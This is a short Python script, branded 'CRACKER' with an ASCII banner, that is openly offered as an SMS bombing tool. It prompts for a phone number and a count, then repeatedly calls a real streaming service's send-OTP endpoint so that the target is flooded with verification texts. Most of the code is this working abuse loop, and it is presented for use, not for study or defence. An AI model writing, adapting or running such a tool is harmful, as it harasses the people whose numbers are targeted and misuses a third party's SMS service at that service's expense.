#sms bombing

import requests
import os

#clear
os.system('clear')


def logo():
	print("              ￼ ‌￼ ￼ ￼ ￼ ￼")
	print("              ￼")
	print("              ￼")
	print("              ￼     'CRACKER' ")
	print("              ￼")
	print("              ￼  Crack Your World")
	print("              ￼")
	print("              ￼")
	print("              ￼ ￼ ￼ ￼ ￼ ￼")
	print("")
	print("|==================|==================|")
	print("|              'CRACKER'              |")
	print("|==================|==================|")
	print("|      Tool        |    SMS BOMBING   |")
	print("|=====================================|")

#49 =
#=======================================
#===================
#￼ ￼ ￼ ￼ ￼ ￼

logo()

#logo end

print("")
print("")

#programing start
import requests
#GET METHOD

number=str(input("Enter Your Number : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=86"+number+"&operator=bd-otp"

amount=int(input("Enter Your Amount: "))

for i in range(amount):
	requests.get(api)
	print(str(i+1)+"SMS SEND")

#programing end

#end customize

print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
print("")


#Tool end